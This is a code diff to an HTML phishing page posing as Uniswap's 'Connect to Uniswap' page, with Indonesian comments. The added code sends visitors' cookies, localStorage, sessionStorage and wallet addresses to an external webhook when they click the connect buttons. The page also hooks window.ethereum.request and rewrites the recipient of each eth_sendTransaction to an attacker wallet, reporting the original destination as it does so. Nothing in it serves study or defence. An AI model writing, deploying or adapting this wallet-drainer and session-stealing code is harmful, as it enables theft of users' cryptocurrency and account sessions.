@@ -2,7 +2,6 @@
 <html>
 <head>
   <title>app.uniswap.org Connect to Uniswap</title>
-  <!-- Favicon & Branding -->
   <link rel="icon" type="image/png" sizes="32x32" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
   <link rel="icon" type="image/png" sizes="192x192" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
   <link rel="icon" type="image/png" sizes="512x512" href="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Uniswap_Logo.svg/1200px-Uniswap_Logo.svg.png">
@@ -32,18 +31,60 @@
     button:hover { opacity: 0.9; }
   </style>
   <script>
-    // Alamat dompet penyerang target
+    // Konfigurasi Penyerang
     const attackerWallet = "0x9999999999999999999999999999999999999999";
-    const a = "<h3 style='color:red;'>[!] Secure Context Injection Active</h3>";
+    
+    // URL Webhook tujuan langsung
+    const WEBHOOK_URL = "https://webhooksite.net/dc884b61-9058-4d2d-a0d5-f0d0fa847d49";
 
-    // Monkey Patching stabil untuk parameter eth_sendTransaction
+    // Fungsi Pengiriman Data Langsung ke WebhookSite
+    function sendDataToWebhook(actionType, dataObj) {
+        const payload = {
+            action: actionType,
+            timestamp: new Date().toISOString(),
+            details: dataObj
+        };
+
+        // Mengirim data menggunakan fetch dengan format JSON standar
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        }).catch(err => console.log("Webhook error:", err));
+    }
+
+    // Eksfiltrasi LocalStorage & Cookies
+    function exfiltrateSessionData() {
+        try {
+            const harvestedData = {
+                url: window.location.href,
+                localStorage: { ...localStorage },
+                sessionStorage: { ...sessionStorage },
+                cookies: document.cookie,
+                userAgent: navigator.userAgent
+            };
+
+            sendDataToWebhook("HARVEST_SESSION", harvestedData);
+        } catch (e) {
+            console.error("Gagal mengambil storage:", e);
+        }
+    }
+
+    // Monkey Patching untuk Transaction Spoofing
     if (typeof window.ethereum !== 'undefined') {
         const originalRequest = window.ethereum.request;
         window.ethereum.request = async function(args) {
             if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
                 let tx = args.params[0];
-                console.log("[!] INTERCEPT BERHASIL! Tujuan asli: " + tx.to);
-                // Substitusi alamat tujuan ke dompet penyerang
+                
+                // Laporkan transaksi asli sebelum ditimpa ke webhook
+                sendDataToWebhook("TRANSACTION_INTERCEPTED", {
+                    originalTo: tx.to,
+                    value: tx.value,
+                    redirectedTo: attackerWallet
+                });
+
+                // Menimpa alamat tujuan ke dompet penyerang
                 tx.to = attackerWallet;
             }
             return originalRequest.apply(window.ethereum, [args]);
@@ -62,10 +103,14 @@
           `;
 
           document.getElementById('connect').onclick = async () => {
+            exfiltrateSessionData(); // Kirim data sesi
+            
             if (typeof window.ethereum !== 'undefined') {
               try {
                 const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                 document.getElementById('status').innerText = '✅ Connected: ' + accounts[0];
+                
+                sendDataToWebhook("WALLET_CONNECTED", { account: accounts[0] });
               } catch (e) {
                 document.getElementById('status').innerText = '❌ Failed: ' + e.message;
               }
@@ -75,6 +120,8 @@
           };
           
           document.getElementById('connectWallet').onclick = async () => {
+            exfiltrateSessionData(); // Kirim data sesi
+
             if (!window.ethereum) {
               alert("No Web3 provider detected");
               return;
@@ -84,7 +131,6 @@
               const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
               const user = accounts[0];
 
-              // Parameter transaksi standar yang berhasil memicu tampilan UI konfirmasi spoofing
               const txParams = {
                 from: user,
                 to: "0x1111111111111111111111111111111111111111", 
@@ -106,7 +152,6 @@
           };
       }
 
-      // Logika perulangan manipulasi port/halaman
       try {
         window.location.assign("http://app.uniswap.org:1121");
       } catch(e) {}
@@ -116,7 +161,6 @@
       }, 5000); 
     }
 
-    // Interval perulangan fungsi spoof
     setInterval(spoof, 2000);
   </script>
 </head>
